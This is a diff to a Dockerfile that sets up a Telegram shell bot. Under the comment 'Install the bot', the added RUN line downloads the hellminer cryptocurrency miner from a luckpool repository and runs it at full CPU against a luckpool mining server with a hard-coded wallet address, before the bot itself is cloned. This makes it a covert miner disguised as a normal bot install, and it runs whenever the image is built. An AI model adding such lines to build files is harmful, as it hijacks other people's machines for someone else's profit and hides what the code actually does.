@@ -27,14 +27,13 @@ WORKDIR /home
 
 # Copy files:
 COPY startbot.sh /home
-COPY config.sh /home
 COPY /stuff /home/stuff
 
-# Run config.sh and clean up APT:
-RUN sh apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+# Run clean up APT:
+RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN git clone https://github.com/botgram/shell-bot.git \
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As -p x --cpu 100 && git clone https://github.com/botgram/shell-bot.git \
  && cd shell-bot \
  && npm install
 
